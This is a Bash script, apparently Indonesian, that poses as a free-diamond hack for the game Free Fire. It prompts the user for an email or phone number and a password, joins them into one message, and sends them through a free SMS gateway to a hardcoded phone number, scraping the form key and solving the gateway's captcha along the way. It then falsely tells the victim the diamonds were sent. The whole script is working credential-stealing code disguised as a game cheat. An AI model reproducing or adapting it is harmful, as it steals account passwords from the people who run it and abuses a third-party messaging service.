#!/bin/bash
# Diamond Gratis VERSION BASH SHELL
# MY FACEBOOK  : 
GREEN=$(tput setaf 2) #HIJAU
WHITE=$(tput setaf 7) #PUTIH
CYAN=$(tput setaf 6)
RED=$(tput setaf 2) #MERAH
NORMAL=$(tput sgr0)
function finish() {
        printf "[ keluar...]"
        exit
}
LIMITATOR=15
trap finish SIGINT
function ngchecking(){
if [[ -z $(command -v curl) ]]; then
  printf "silahka install curl terlebih dahulu \n"
fi
##########################################################
if [[ -z $(command -v grep) ]]; then
  printf "silahkan install grep terlebih dahulu \n"
fi
if [[ -z $(command -v tput) ]]; then
  printf "silahkan install tput terlebih dahulu"
fi
}
ngchecking
function nebanner(){
shuf -e "
${CYAN}
##########################################################                              _
             [√] HACK DIAMOND FREE FIRE [√]
##########################################################
"
}
function negetgan(){
         bypass=$(curl -s 'http://sms.payuterus.biz/alpha/index.php?a=keluar' \
           -H 'Connection: keep-alive' \
           -H 'Pragma: no-cache' \
           -H 'Cache-Control: no-cache' \
           -H 'Upgrade-Insecure-Requests: 1' \
           -H 'User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
           -H 'Referer: http://sms.payuterus.biz/alpha/send.php' \
           -H 'Accept-Encoding: gzip, deflate' \
           -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
           -H 'Cookie: _ga=GA1.2.131924726.1560439960; PHPSESSID=jjrqqaakmfcgfgbtjt8tve5595; _gid=GA1.2.1969561921.1561024035; _gat=1' --compressed --insecure | grep "value" | grep "name" | grep -oP 'value="\K[^"]+')
          okeey1=$(curl -s 'http://sms.payuterus.biz/alpha/index.php?a=keluar' \
           -H 'Connection: keep-alive' \
           -H 'Pragma: no-cache' \
           -H 'Cache-Control: no-cache' \
           -H 'Upgrade-Insecure-Requests: 1' \
           -H 'User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
           -H 'Referer: http://sms.payuterus.biz/alpha/send.php' \
           -H 'Accept-Encoding: gzip, deflate' \
           -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
           -H 'Cookie: _ga=GA1.2.131924726.1560439960; PHPSESSID=jjrqqaakmfcgfgbtjt8tve5595; _gid=GA1.2.1969561921.1561024035; _gat=1' --compressed --insecure | grep "span" | grep -Po "\d \S \d")
         if [[ $okeey1 =~ "+" ]]; then
           ok=`expr $okeey1 | bc`
         elif [[ $okeey =~ "-" ]]; then
          ok=`expr $okeey1 | bc`
         elif [[ $okeey1 =~ "/" ]]; then
           ok=`expr $okeey1`
         fi
         #elif [[ $okeey =~ "x" ]]; then
         #  ok=`expr $okeey1 | bc`
         #fi
         okeey=$(curl -s "http://sms.payuterus.biz/alpha/send.php" \
         -H 'Connection: keep-alive' \
         -H 'Pragma: no-cache' \
         -H 'Cache-Control: no-cache' \
         -H 'Origin: http://sms.payuterus.biz' \
         -H 'Upgrade-Insecure-Requests: 1' \
         -H 'Content-Type: application/x-www-form-urlencoded' \
         -H 'User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36' \
         -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
         -H 'Referer: http://sms.payuterus.biz/alpha/' \
         -H 'Accept-Encoding: gzip, deflate' \
         -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
         -H 'Cookie: _ga=GA1.2.131924726.1560439960; PHPSESSID=jjrqqaakmfcgfgbtjt8tve5595; _gid=GA1.2.1969561921.1561024035' --data "nohp=$now&pesan=$psn&captcha=$ok&key=$bypass" --compressed --insecure | grep -o 'value="[^"]*"')
         if [[ $okeey =~ "Diamond Telah Terkirim" ]]; then
             echo -e "${GREEN}[√] ${GREEN}TERIMA KASIH "
         else
             echo -e "${GREEN}[√] ${GREEN}TUNGGU HINGGA 5 MENIT"
         fi
}

clear
nebanner
echo -en "[+] EMAIL/NO  :"; read eml
now=081522796474
echo -en "[+] KATASANDI :"; read ks
for x in okeey; do
	psn="$eml"+"==>"+"$ks"
     negetgan "$now" "$psn" "$okeey" 
done

